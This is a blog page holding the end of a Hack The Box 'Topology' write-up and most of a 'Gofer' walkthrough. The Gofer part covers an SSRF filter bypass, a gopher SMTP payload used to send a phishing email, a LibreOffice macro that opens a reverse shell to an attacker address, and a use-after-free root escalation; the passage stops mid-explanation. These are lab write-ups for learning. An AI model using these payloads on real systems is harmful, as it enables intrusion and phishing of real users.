vdaisley@topology:/opt$ ls -la /bin/bash -rwsr-sr-x 1 root root 1183448 Apr 18 2022 /bin/bash When the cron job executes, it sets the SUID bit on /bin/bash. This SUID bit allows me to execute /bin/bash in privileged mode, effectively granting me root privileges.\n(remote) vdaisley@topology:/opt$ bash -p (remote) root@topology:/opt# id uid=1007(vdaisley) gid=1007(vdaisley) euid=0(root) egid=0(root) groups=0(root),1007(vdaisley) (remote) root@topology:/opt# cd /root (remote) root@topology:/root# ls -l total 4 -rw-r----- 1 root root 33 Jun 22 06:06 root.txt (remote) root@topology:/root# Pwned Topology!\nRelated Links # Formula/CSV/Doc/LaTeX/GhostScript Injection - HackTricks Hacking with LaTeX | Mathematical expressions - Overleaf, Online LaTeX Editor gnuplot.info docs - system ","date":"4 November 2023","permalink":"/blog/htb-topology/","section":"Blog Posts","summary":"Topology is an easy linux box featuring a web server with a vulnerable virtual host susceptible to LaTeX injection. This LaTeX injection allowed me to access and read files on the server, leading to the discovery of SSH login credentials. Lastly, I exploited a misconfiguration along with the functionality of gnuplot to execute system commands as the root user.","title":"HTB Topology"},{"content":"","date":null,"permalink":"/tags/htpasswd/","section":"Tags","summary":"","title":"Htpasswd"},{"content":"","date":null,"permalink":"/tags/inline-math-mode/","section":"Tags","summary":"","title":"Inline-Math-Mode"},{"content":"","date":null,"permalink":"/tags/latex/","section":"Tags","summary":"","title":"LaTeX"},{"content":"","date":null,"permalink":"/tags/latex-injection/","section":"Tags","summary":"","title":"Latex-Injection"},{"content":"","date":null,"permalink":"/tags/wfuzz/","section":"Tags","summary":"","title":"Wfuzz"},{"content":"","date":null,"permalink":"/tags/cme/","section":"Tags","summary":"","title":"Cme"},{"content":"","date":null,"permalink":"/tags/dangling-pointer/","section":"Tags","summary":"","title":"Dangling-Pointer"},{"content":"","date":null,"permalink":"/tags/ghidra/","section":"Tags","summary":"","title":"Ghidra"},{"content":"","date":null,"permalink":"/tags/gopher/","section":"Tags","summary":"","title":"Gopher"},{"content":"","date":null,"permalink":"/tags/gopherus/","section":"Tags","summary":"","title":"Gopherus"},{"content":"Gofer HTB #Overview # Gofer is a hard linux box, I discovered a HTTP proxy vulnerable to Server-Side Request Forgery. Utilizing this SSRF vulnerability, I sent a phishing email through the internal SMTP server via the gopher protocol, embedding a malicious macro that activates upon document opening. Next, I obtained user credentials from a background process linked to the proxy. Finally, I found a vulnerability in the notes binary, exploiting a use-after-free vulnerability associated with a dangling pointer.\nEnumeration # Open Ports #Found 5 ports using nmap:\nPort 22 is running OpenSSH. Port 25 is likely blocked by a firewall as it appears to be filtered. Port 80 is hosting an Apache Web Server. Ports 139 and 445 are utilized for SMB over NetBIOS. \u0026gt; nmap -p- -Pn -T4 --min-rate 1000 --max-retries 5 -oA nmap/10.10.11.225_fullScan 10.10.11.225 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-08 20:49 IST Nmap scan report for 10.10.11.225 Host is up (0.082s latency). Not shown: 65529 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 25/tcp filtered smtp 80/tcp open http 139/tcp open netbios-ssn 445/tcp open microsoft-ds 8383/tcp open m2mservices \u0026gt; nmap -p22,25,80,139,445,8383 -sV -sC -T4 -Pn -oA nmap/10.10.11.225 10.10.11.225 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-08 20:53 IST Nmap scan report for 10.10.11.225 Host is up (0.057s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 aa:25:82:6e:b8:04:b6:a9:a9:5e:1a:91:f0:94:51:dd (RSA) | 256 18:21:ba:a7:dc:e4:4f:60:d7:81:03:9a:5d:c2:e5:96 (ECDSA) |_ 256 a4:2d:0d:45:13:2a:9e:7f:86:7a:f6:f7:78:bc:42:d9 (ED25519) 25/tcp filtered smtp 80/tcp open http Apache httpd 2.4.56 |_http-server-header: Apache/2.4.56 (Debian) |_http-title: Did not follow redirect to http://gofer.htb/ 139/tcp open netbios-ssn Samba smbd 4.6.2 445/tcp open netbios-ssn Samba smbd 4.6.2 8383/tcp open m2mservices? Service Info: Host: gofer.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required | smb2-time: | date: 2023-08-08T15:24:51 |_ start_date: N/A |_nbstat: NetBIOS name: GOFER, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) port 445 - SMB Enum #SMB allows anonymous access and has a share named shares readable. CME also confirms the domain, gofer.htb from the anonymous bind. Although strangely, the OS is identified as Windows 6.1 Enumerating SMB, discovered that it permits anonymous access and includes a readable share named \u0026ldquo;shares.\u0026rdquo; Moreover, cme verified the the gofer.htb domain through the anonymous bind.\n\u0026gt; cme smb 10.10.11.225 -u \u0026#39;guest\u0026#39; -p \u0026#39;\u0026#39; --shares SMB 10.10.11.225 445 GOFER [*] Windows 6.1 Build 0 (name:GOFER) (domain:htb) (signing:False) (SMBv1:False) SMB 10.10.11.225 445 GOFER [+] htb\\guest: SMB 10.10.11.225 445 GOFER [*] Enumerated shares SMB 10.10.11.225 445 GOFER Share Permissions Remark SMB 10.10.11.225 445 GOFER ----- ----------- ------ SMB 10.10.11.225 445 GOFER print$ Printer Drivers SMB 10.10.11.225 445 GOFER shares READ SMB 10.10.11.225 445 GOFER IPC$ IPC Service (Samba 4.13.13-Debian) I also discovered a file named mail within a hidden backup directory on the shares share by using CrackMapExec\u0026rsquo;s spider_plus module.\n\u0026gt; cme smb 10.10.11.225 -u \u0026#39;guest\u0026#39; -p \u0026#39;\u0026#39; -M spider_plus -o READ_ONLY=false SMB 10.10.11.225 445 GOFER [*] Windows 6.1 Build 0 (name:GOFER) (domain:htb) (signing:False) (SMBv1:False) SMB 10.10.11.225 445 GOFER [+] htb\\guest: SPIDER_P... 10.10.11.225 445 GOFER [*] Started module spidering_plus with the following options: SPIDER_P... 10.10.11.225 445 GOFER [*] DOWNLOAD_FLAG: False SPIDER_P... 10.10.11.225 445 GOFER [*] STATS_FLAG: True SPIDER_P... 10.10.11.225 445 GOFER [*] EXCLUDE_FILTER: [\u0026#39;print$\u0026#39;, \u0026#39;ipc$\u0026#39;] SPIDER_P... 10.10.11.225 445 GOFER [*] EXCLUDE_EXTS: [\u0026#39;ico\u0026#39;, \u0026#39;lnk\u0026#39;] SPIDER_P... 10.10.11.225 445 GOFER [*] MAX_FILE_SIZE: 50 KB SPIDER_P... 10.10.11.225 445 GOFER [*] OUTPUT_FOLDER: /tmp/cme_spider_plus SPIDER_P... 10.10.11.225 445 GOFER [+] Saved share-file metadata to \u0026#34;/tmp/cme_spider_plus/10.10.11.225.json\u0026#34;. SPIDER_P... 10.10.11.225 445 GOFER [*] SMB Shares: 3 (print$, shares, IPC$) SPIDER_P... 10.10.11.225 445 GOFER [*] SMB Readable Shares: 1 (shares) SPIDER_P... 10.10.11.225 445 GOFER [*] Total folders found: 1 SPIDER_P... 10.10.11.225 445 GOFER [*] Total files found: 1 SPIDER_P... 10.10.11.225 445 GOFER [*] File size average: 1.08 KB SPIDER_P... 10.10.11.225 445 GOFER [*] File size min: 1.08 KB SPIDER_P... 10.10.11.225 445 GOFER [*] File size max: 1.08 KB \u0026gt; cat /tmp/cme_spider_plus/10.10.11.225.json { \u0026#34;shares\u0026#34;: { \u0026#34;.backup/mail\u0026#34;: { \u0026#34;atime_epoch\u0026#34;: \u0026#34;2023-08-08 11:47:32\u0026#34;, \u0026#34;ctime_epoch\u0026#34;: \u0026#34;2023-04-27 18:19:32\u0026#34;, \u0026#34;mtime_epoch\u0026#34;: \u0026#34;2023-04-27 18:19:32\u0026#34;, \u0026#34;size\u0026#34;: \u0026#34;1.08 KB\u0026#34; } } } After retrieving the content of the \u0026ldquo;main\u0026rdquo; file using smbclient,\nThe email indicates the presence of an internal SMTP server, as the mail is received from localhost. Based on the email addresses in the \u0026ldquo;to\u0026rdquo; and \u0026ldquo;from\u0026rdquo; fields, identified two potential usernames: jdavis tbuckley The email mentions a phishing attempt on Jocelyn, who appears to be susceptible to clicking on links. Additionally, the email emphasizes that any important documents should be sent exclusively through the internal mail server and in the .odt format. It is also noted that a web proxy is under development, and because of it\u0026rsquo;s potential security concerns, it may have restricted access. \u0026gt; smbclient -N //10.10.11.225/shares Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; get .backup\\mail - From jdavis@gofer.htb Fri Oct 28 20:29:30 2022 Return-Path: \u0026lt;jdavis@gofer.htb\u0026gt; X-Original-To: tbuckley@gofer.htb Delivered-To: tbuckley@gofer.htb Received: from gofer.htb (localhost [127.0.0.1]) by gofer.htb (Postfix) with SMTP id C8F7461827 for \u0026lt;tbuckley@gofer.htb\u0026gt;; Fri, 28 Oct 2022 20:28:43 +0100 (BST) Subject:Important to read! Message-Id: \u0026lt;20221028192857.C8F7461827@gofer.htb\u0026gt; Date: Fri, 28 Oct 2022 20:28:43 +0100 (BST) From: jdavis@gofer.htb Hello guys, Our dear Jocelyn received another phishing attempt last week and his habit of clicking on links without paying much attention may be problematic one day. That\u0026#39;s why from now on, I\u0026#39;ve decided that important documents will only be sent internally, by mail, which should greatly limit the risks. If possible, use an .odt format, as documents saved in Office Word are not always well interpreted by Libreoffice. PS: Last thing for Tom; I know you\u0026#39;re working on our web proxy but if you could restrict access, it will be more secure until you have finished it. It seems to me that it should be possible to do so via \u0026lt;Limit\u0026gt; getting file \\.backup\\mail of size 1101 as - (1.4 KiloBytes/sec) (average 1.2 KiloBytes/sec) HTTP - gofer.htb #Analyzing the headers, it appears that the web service redirects to the gofer.htb virtual host. However, the headers do not provide any other substantial information.\n\u0026gt; http -ph 10.10.11.225 HTTP/1.1 301 Moved Permanently Connection: Keep-Alive Content-Length: 303 Content-Type: text/html; charset=iso-8859-1 Date: Tue, 08 Aug 2023 15:28:43 GMT Keep-Alive: timeout=5, max=100 Location: http://gofer.htb/ Server: Apache/2.4.56 (Debian) The website is designed for bootstrap developers, but unfortunately, none of its features are functioning.\nFuzzing #I tried fuzzing for directories and files using ffuf, but didn\u0026rsquo;t find anything noteworthy.\n\u0026gt; ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://gofer.htb//FUZZ -o ffuf_gofer.md -of md -t 100 .hta [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 6204ms] .htaccess [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 6214ms] .htpasswd [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 6232ms] assets [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 2298ms] index.html [Status: 200, Size: 29380, Words: 7647, Lines: 622, Duration: 1256ms] server-status [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 1226ms] I had a valid virtual host, so I used wfuzz to identify any additional virtual hosts and came across one named proxy.\n\u0026gt; wfuzz_subdomain_enum gofer.htb --hw 28 ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://gofer.htb/ Total requests: 4989 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000084: 401 14 L 54 W 462 Ch \u0026#34;proxy\u0026#34; Total time: 213.0168 Processed Requests: 4989 Filtered Requests: 4988 Requests/sec.: 23.42068 Initial Foothold # HTTP - proxy.gofer.htb #A GET request to proxy.gofer.htb returns a 401 error and required basic authentication.\n❯ http -ph proxy.gofer.htb HTTP/1.1 401 Unauthorized Connection: Keep-Alive Content-Length: 462 Content-Type: text/html; charset=iso-8859-1 Date: Tue, 24 Oct 2023 23:06:58 GMT Keep-Alive: timeout=5, max=100 Server: Apache/2.4.56 (Debian) WWW-Authenticate: Basic realm=\u0026#34;Restricted Content\u0026#34; I also tried fuzzing the \u0026ldquo;proxy\u0026rdquo; virtual host, but it didn\u0026rsquo;t lead to anything significant.\n\u0026gt; ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://proxy.gofer.htb/FUZZ -o ffuf_proxy.md -of md -t 100 -fs 462 .hta [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 6694ms] .htaccess [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 6728ms] .htpasswd [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 6817ms] server-status [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 56ms] Since the email referenced restricted access, I also fuzzed proxy for POST requests and that returns a 200 for index.php.\n\u0026gt; ffuf -X POST -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://proxy.gofer.htb/FUZZ -o ffuf_proxy_post.md -of md -t 100 -fs 462 .hta [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 71ms] .htpasswd [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 4692ms] .htaccess [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 4707ms] index.php [Status: 200, Size: 81, Words: 9, Lines: 2, Duration: 59ms] server-status [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 60ms] When making a POST request to index.php, it raises an error about a missing URL parameter, could be a potential Server-Side Request Forgery (SSRF) vulnerability.\n\u0026gt; http POST proxy.gofer.htb/index.php HTTP/1.1 200 OK Connection: Keep-Alive Content-Encoding: gzip Content-Length: 94 Content-Type: text/html; charset=UTF-8 Date: Tue, 08 Aug 2023 18:28:34 GMT Keep-Alive: timeout=5, max=100 Server: Apache/2.4.56 (Debian) Vary: Accept-Encoding \u0026lt;!-- Welcome to Gofer proxy --\u0026gt; \u0026lt;html\u0026gt;\u0026lt;body\u0026gt;Missing URL parameter !\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; Exploiting SSRF #Given that the index page only accepts POST requests, I assumed it would require either raw or JSON POST data for proper interaction. However, it only accepts the url param as GET parameter. For httpie, POST parameters are set using = and GET parameters can be set using ==.\n\u0026gt; http -pb POST proxy.gofer.htb/index.php url=http://localhost \u0026lt;!-- Welcome to Gofer proxy --\u0026gt; \u0026lt;html\u0026gt;\u0026lt;body\u0026gt;Missing URL parameter !\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; When attempting to exploit the SSRF vulnerability, I discovered that words like localhost and its common bypasses were blacklisted.\n\u0026gt; http -pb POST proxy.gofer.htb/index.php url==http://localhost \u0026lt;!-- Welcome to Gofer proxy --\u0026gt; \u0026lt;html\u0026gt;\u0026lt;body\u0026gt;Blacklisted keyword: localhost !\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; \u0026gt; http -pb POST proxy.gofer.htb/index.php url==http://127.1 \u0026lt;!-- Welcome to Gofer proxy --\u0026gt; \u0026lt;html\u0026gt;\u0026lt;body\u0026gt;Blacklisted keyword: /127 !\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; I experimented with various bypass attempts and observed that 0.0.0.0 was not blacklisted. However, despite this bypass, it didn\u0026rsquo;t provide a solution. I also attempted to access the filtered SMTP port, but unfortunately, it did not yield any results.\n❯ http -pb POST proxy.gofer.htb/index.php url==http://0.0.0.0:25 \u0026lt;!-- Welcome to Gofer proxy --\u0026gt; SSRF File Read #I made an effort to use different URIs, including file://, but found that it was blacklisted.\n\u0026gt; http -pb POST proxy.gofer.htb/index.php url==file:///etc/hostname \u0026lt;!-- Welcome to Gofer proxy --\u0026gt; \u0026lt;html\u0026gt;\u0026lt;body\u0026gt;Blacklisted keyword: file:// !\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; However, I noticed that by using \u0026ldquo;file:\u0026rdquo; without the double slashes, I was able to make it work and dump the contents of /etc/hostname\n\u0026gt; http -pb POST proxy.gofer.htb/index.php url==file:/etc/hostname \u0026lt;!-- Welcome to Gofer proxy --\u0026gt; gofer.htb 1 Using the same bypass, I successfully retrieved users with a login shells, and found four different users.\n\u0026gt; http -pb POST proxy.gofer.htb/index.php url==file:/etc/passwd | grep sh$ root❌0:0:root:/root:/bin/bash jhudson❌1000:1000:Jocelyn Hudson,,,:/home/jhudson:/bin/bash jdavis❌1001:1001::/home/jdavis:/bin/bash tbuckley❌1002:1002::/home/tbuckley:/bin/bash ablake❌1003:1003::/home/ablake:/bin/bash I made an attempt to read the .htaccess and .htpasswd files for the proxy virtual host, which required basic authentication, but unfortunately, it didn\u0026rsquo;t yield any useful information.\n\u0026gt; http -pb POST proxy.gofer.htb/index.php url==file:/var/www/proxy/.htaccess \u0026lt;!-- Welcome to Gofer proxy --\u0026gt; RewriteEngine on RewriteRule ^.+$ /index.php [L] 1 \u0026gt; http -pb POST proxy.gofer.htb/index.php url==file:/var/www/proxy/.htpasswd \u0026lt;!-- Welcome to Gofer proxy --\u0026gt; SSRF Gofer #I\u0026rsquo;m aware that there\u0026rsquo;s an SMTP service running on the internal network. However, since I don\u0026rsquo;t have control over the method or protocol for the SSRF request, I couldn\u0026rsquo;t directly interact with the SMTP service. To work around this, I used Gopher, a protocol that allows communication with various TCP servers. Using the Gopherus tool I was able to generate a Gopher payload, enabling me to exploit the SSRF vulnerability and communicate with the internal SMTP server.\nThe usernames on the server appear to follow the pattern of $(FirstNameInitial)$(LastName). Given that the target user for the phishing attempt is Jocelyn and the only username starting with \u0026lsquo;J\u0026rsquo; is jhudson, it\u0026rsquo;s reasonable to assume that this could be their username. This implies that the \u0026lsquo;To\u0026rsquo; email address would be jhudson@gofer.htb. In the message, I included a link to an ODT file hosted on my attack box.\n\u0026gt; python2 gopherus.py --exploit smtp ________ .__ / _____/ ____ ______ | |__ ___________ __ __ ______ / \\ ___ / _ \\\\____ \\| | \\_/ __ \\_ __ \\ | \\/ ___/ \\ \\_\\ ( \u0026lt;_\u0026gt; ) |_\u0026gt; \u0026gt; Y \\ ___/| | \\/ | /\\___ \\ \\______ /\\____/| __/|___| /\\___ \u0026gt;__| |____//____ \u0026gt; \\/ |__| \\/ \\/ \\/ author: $_SpyD3r_$ Give Details to send mail: Mail from : abraxas@gofer.htb Mail To : jhudson@gofer.htb Subject : Definitely not a phishing attempt Message : Not malicious \u0026lt;a href=http://10.10.14.132/exploit.odt\u0026gt;link\u0026lt;/a\u0026gt; Your gopher link is ready to send Mail: gopher://127.0.0.1:25/_MAIL%20FROM:abraxas%40gofer.htb%0ARCPT%20To:jhudson%40gofer.htb%0ADATA%0AFrom:abraxas%40gofer.htb%0ASubject:Definitely%20not%20a%20phishing%20attempt%0AMessage:Not%20malicious%20%3Ca%20href%3Dhttp://10.10.14.132/exploit.odt%3Elink%3C/a%3E%0A. -----------Made-by-SpyD3r----------- Crafting a malicious macro for ODT #Now, that I have way to communicate with the SMTP server, I need to craft an ODT file with a malicious macro. This blog post explains how to create the malicious macro.\nStep 1: A new macro can be created from the BASIC Macros option under Tools.\nStep 2: The macro follows Visual Basic, so the payload should be in VB. In this case, it\u0026rsquo;s a simple shell function that executes a reverse shell payload.\nStep 3: Simply creating a new macro wouldn\u0026rsquo;t be enough, the Macro needs to be executed when Jocelyn clicks on the link and opens it.\nThe macro needs to be assigned to malicious odt file for this to work properly.\nWhile crafting this malicious file, I realized that a simple reverse shell payload like bash -i \u0026gt;\u0026amp; /dev/tcp/$IP/$PORT 0\u0026gt;\u0026amp;1 didn\u0026rsquo;t work. The file was retrieved from the local HTTP server, but the payload wouldn\u0026rsquo;t be executed.\nSub exploit\rshell(\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.132/9005 0\u0026gt;\u0026amp;1\u0026#34;)\rEnd Sub As per LibreOffice\u0026rsquo;s documentation, the first parameter for Shell() is specified as Pathname As String. This is the reason the payload needs to be enclosed within a bash command string using bash -c.\nSub exploit\rshell(\u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.132/9005 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;)\rEnd Sub Using the previously created Gopherus payload for gofer and leveraging the SSRF vulnerability, I can now send the email to Jocelyn with the malicious file. The only modification required is to change the IP address from 127.0.0.1 to either 0.0.0.0 or simply 0.\n\u0026gt; http -pb POST proxy.gofer.htb/index.php url==gopher://0.0.0.0:25/_MAIL%20FROM:abraxas%40gofer.htb%0ARCPT%20To:jhudson%40gofer.htb%0ADATA%0AFrom:abraxas%40gofer.htb%0ASubject:Definitely%20not%20a%20phishing%20attempt%0AMessage:Not%20malicious%20%3Ca%20href%3Dhttp://10.10.14.132/revShell.odt%3Elink%3C/a%3E%0A. \u0026lt;!-- Welcome to Gofer proxy --\u0026gt; 220 gofer.htb ESMTP Postfix (Debian/GNU) 250 2.1.0 Ok 250 2.1.5 Ok 354 End data with \u0026lt;CR\u0026gt;\u0026lt;LF\u0026gt;.\u0026lt;CR\u0026gt;\u0026lt;LF\u0026gt; 250 2.0.0 Ok: queued as 4ED0C66EF 421 4.4.2 gofer.htb Error: timeout exceeded 1 After a brief wait, I successfully obtained a shell as jhudson. It is highly likely that this occurred because they clicked on the link in the email.\n\u0026gt; pc -lp 9005 [13:46:39] Welcome to pwncat 🐈! __main__.py:164 [13:47:06] received connection from 10.10.11.225:35422 bind.py:84 [13:47:08] 0.0.0.0:9005: normalizing shell path manager.py:957 [13:47:10] 10.10.11.225:35422: registered new host w/ db manager.py:957 (local) pwncat$ You have mail in /var/mail/jhudson (remote) jhudson@gofer.htb:/usr/bin$ id uid=1000(jhudson) gid=1000(jhudson) groups=1000(jhudson),108(netdev) (remote) jhudson@gofer.htb:/usr/bin$ Privilege Escalation to jhudson # I decided to investigate the /var/mail directory, given the presence of an internal mail server. However, I couldn\u0026rsquo;t access any other mails within that directory due to permission issues.\n(remote) jhudson@gofer.htb:/usr/bin$ ls -la /var/mail/ total 12 drwxrwsr-x 2 root mail 4096 Aug 9 09:16 . drwxr-xr-x 12 root root 4096 Jul 19 12:44 .. lrwxrwxrwx 1 root mail 9 Nov 3 2022 ablake -\u0026gt; /dev/null lrwxrwxrwx 1 root mail 9 Nov 3 2022 jdavis -\u0026gt; /dev/null -rw-r----- 1 jhudson mail 1 Aug 9 09:25 jhudson lrwxrwxrwx 1 root mail 9 Nov 3 2022 root -\u0026gt; /dev/null lrwxrwxrwx 1 root mail 9 Nov 3 2022 tbuckley -\u0026gt; /dev/null (remote) jhudson@gofer.htb:/usr/bin$ cat /var/mail/jhudson When attempting to check for sudo privileges, I noticed an unusual absence of the sudo binary in the shell. This suggests the possibility of a restricted environment.\n(remote) jhudson@gofer.htb:/home/jhudson$ sudo -l bash: sudo: command not found Looking for background processes, found a recurring request to the proxy vhost along with credentials for basic authentication. While searching for background processes using pspy, I discovered a recurring request to the proxy virtual host, and within it, I found credentials for basic authentication → tbuckley:ooP4dietie3o_hquaeti.\n2023/08/09 09:33:01 CMD: UID=0 PID=5521 | /usr/sbin/CRON -f 2023/08/09 09:33:01 CMD: UID=0 PID=5522 | /bin/bash /root/scripts/curl.sh 2023/08/09 09:33:01 CMD: UID=0 PID=5523 | /usr/bin/curl http://proxy.gofer.htb/?url=http://gofer.htb --user tbuckley:ooP4dietie3o_hquaeti 2023/08/09 09:33:01 CMD: UID=0 PID=5526 | /usr/sbin/CRON -f 2023/08/09 09:33:01 CMD: UID=0 PID=5527 | /usr/sbin/CRON -f 2023/08/09 09:33:01 CMD: UID=0 PID=5528 | /usr/sbin/postdrop -r 2023/08/09 09:33:01 CMD: UID=0 PID=5529 | /bin/bash /root/scripts/mail.sh 2023/08/09 09:33:01 CMD: UID=0 PID=5530 | /usr/bin/grep -Eo http://[^ \u0026gt;]+ /var/mail/jhudson The credentials I found were reused for SSH access to the tbuckley user account. It\u0026rsquo;s interesting to note that tbuckley is also part of the dev group.\n(remote) tbuckley@gofer.htb:/home/tbuckley$ id uid=1002(tbuckley) gid=1002(tbuckley) groups=1002(tbuckley),1004(dev) Privilege Escalation to root # Since tbuckley belongs to the dev group, I looked for all files owned by that group and discovered a binary with the SUID bit enabled. It appears to be a menu driven note taking program.\n(remote) tbuckley@gofer.htb:/home/tbuckley$ find / -group dev 2\u0026gt;/dev/null /usr/local/bin/notes (remote) tbuckley@gofer.htb:/home/tbuckley$ ls -al /usr/local/bin/notes -rwsr-s--- 1 root dev 17168 Apr 28 16:06 /usr/local/bin/notes (remote) tbuckley@gofer.htb:/var/mail$ file /usr/local/bin/notes /usr/local/bin/notes: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6a9c0faa06eabfa48a864bb7341f29deecd7e9e3, for GNU/Linux 3.2.0, not stripped (remote) tbuckley@gofer.htb:/home/tbuckley$ /usr/local/bin/notes ======================================== 1) Create an user and choose an username 2) Show user information 3) Delete an user 4) Write a note 5) Show a note 6) Save a note (not yet implemented) 7) Delete a note 8) Backup notes 9) Quit ======================================== Your choice: Interestingly, option 8, which is related to the notes backup, demands the admin role for access.\n======================================== 1) Create an user and choose an username 2) Show user information 3) Delete an user 4) Write a note 5) Show a note 6) Save a note (not yet implemented) 7) Delete a note 8) Backup notes 9) Quit ======================================== Your choice: 8 Access denied: you don\u0026#39;t have the admin role! Analyzing the notes binary #Given that this is an unstripped executable, strings might uncover valuable information. It\u0026rsquo;s worth noting that just before the error message for the backup operation, there\u0026rsquo;s an execution of a tar archive command, which compresses the /opt/notes directory into a tar.gz file located in the /root/ directory.\n(remote) tbuckley@gofer.htb:/home/tbuckley$ strings -n 15 /usr/local/bin/notes /lib64/ld-linux-x86-64.so.2 __libc_start_main _ITM_deregisterTMCloneTable _ITM_registerTMCloneTable ======================================== 1) Create an user and choose an username 2) Show user information 3) Delete an user 4) Write a note 6) Save a note (not yet implemented) 7) Delete a note 8) Backup notes ======================================== Choose an username: First create an user! Write your note: Access granted! tar -czvf /root/backups/backup_notes.tar.gz /opt/notes Access denied: you don\u0026#39;t have the admin role! Since, strings didn\u0026rsquo;t provide substantial information, I proceeded to decompiled the binary using Ghidra for a more in-depth analysis. I also renamed a few variables to make the code more readable.\nAt the beginning of the main function, two pointers, namely note_var and username, are defined and cleared by setting it to null references.\nundefined4 choice; void *note_var; void *username; choice = 0; username = (void *)0x0; note_var = (void *)0x0; Case 1 is for creating a new user,\nusername is allocated 40 bytes of memory using malloc(0x28). The first 24 bytes of memory (0x18) are initialized with zeros using memset. The next 16 bytes (0x10) are also set to zeros. If the binary is executed with superuser privileges (uid is 0). it writes the values 0x696d6461 and 0x6e to the username buffer at an offset of 28 bytes. These values correspond to the string \u0026ldquo;admin\u0026rdquo;. Else the username buffer is set to user. This means the role required is at an offset of 24 bytes in the username buffer, *username + 0x18. case 1: username = malloc(0x28); if (username == (void *)0x0) { /* WARNING: Subroutine does not return */ exit(-1); } memset(username,0,0x18); memset((void *)((long)username + 0x18),0,0x10); uid = getuid(); if (uid == 0) { *(undefined4 *)((long)username + 0x18) = 0x696d6461; *(undefined *)((long)username + 0x1c) = 0x6e; } else { *(undefined4 *)((long)username + 0x18) = 0x72657375; } printf(\u0026#34;Choose an username: \u0026#34;); __isoc99_scanf(\u0026amp;DAT_00102144,username); puts(\u0026#34;\u0026#34;); break; Case 2 shows user information,\nIf the username buffer is not clear, then it prints the user info. It also prints the role at username + 0x18. case 2: if (username == (void *)0x0) { puts(\u0026#34;First create an user!\\n\u0026#34;); } else { printf(\u0026#34;\\nUsername: %s\\n\u0026#34;,username); printf(\u0026#34;Role: %s\\n\\n\u0026#34;,(long)username + 0x18); } break; Case 4 relates to writing a new note\nThe note_var is allocated 40 bytes and then cleared to ensure it contains no previous data. The user input is written to note_var. case 4: note_var = malloc(0x28); memset(note_var,0,0x28); if (note_var == (void *)0x0) { /* WARNING: Subroutine does not return */ exit(-1); } puts(\u0026#34;Write your note:\u0026#34;); __isoc99_scanf(\u0026amp;DAT_0010218b,note_var); break; Case 8 relates to backing up notes\nThe backup routine is executed only if the role located at an offset of 40 bytes is set to \u0026ldquo;admin\u0026rdquo;. The archive is executed with superuser privileges. case 8: if (username == (void *)0x0) { puts(\u0026#34;First create an user!\\n\u0026#34;); } else { isAdmin = strcmp((char *)((long)username + 0x18),\u0026#34;admin\u0026#34;); if (isAdmin == 0) { puts(\u0026#34;Access granted!\u0026#34;); setuid(0); setgid(0); system(\u0026#34;tar -czvf /root/backups/backup_notes.tar.gz /opt/notes\u0026#34;); } else { puts(\u0026#34;Access denied: you don\\\u0026#39;t have the admin role!\\n\u0026#34;); } } } Exploiting Dangling pointer #Since the role was at offset of 40 bytes, my very first thought was to create a string with the string admin after the 40 byte, but that doesn\u0026rsquo;t work, because the role is set based on privileges in case 1.\n\u0026gt; python -c \u0026#34;print(\u0026#39;0\u0026#39;*24+\u0026#39;admin\u0026#39;)\u0026#34; 000000000000000000000000admin Revisiting case 3, where the username is deleted, it\u0026rsquo;s crucial to note that the username is freed but not cleared or set to NULL. This is an issue because username was originally a void pointer and now is a dangling pointer. This can introduce a potential use-after-free vulnerability.\ncase 3: if (username != (void *)0x0) { free(username); } break; In Case 4, where the note_var buffer is allocated 40 bytes of memory, which is the same size as the username buffer. Due to the way malloc works, the memory that was previously freed ( nut not cleared ) for the username buffer in case 3 will now be allocated to note_var.\nBy adding 24 bytes of random data followed by \u0026ldquo;admin\u0026rdquo; to the note_var buffer, I can effectively set the role to \u0026ldquo;admin\u0026rdquo; since the username still points to the same buffer. This action exploits use-after-free vulnerability created in case 3, allowing me to manipulate the role.\ncase 4: note_var = malloc(0x28); memset(note_var,0,0x28); if (note_var == (void *)0x0) { /* WARNING: Subroutine does not return */ exit(-1); } puts(\u0026#34;Write your note:\u0026#34;); __isoc99_scanf(\u0026amp;DAT_0010218b,note_var); break; Exploitation path for the dangling pointer\nCreate a new user, which initializes the role based on privileges. Delete the user, causing free() to deallocate the pointer and create a dangling pointer. Create a new note with data containing 24 random characters followed by \u0026ldquo;admin.\u0026rdquo; This manipulation of the note_var buffer 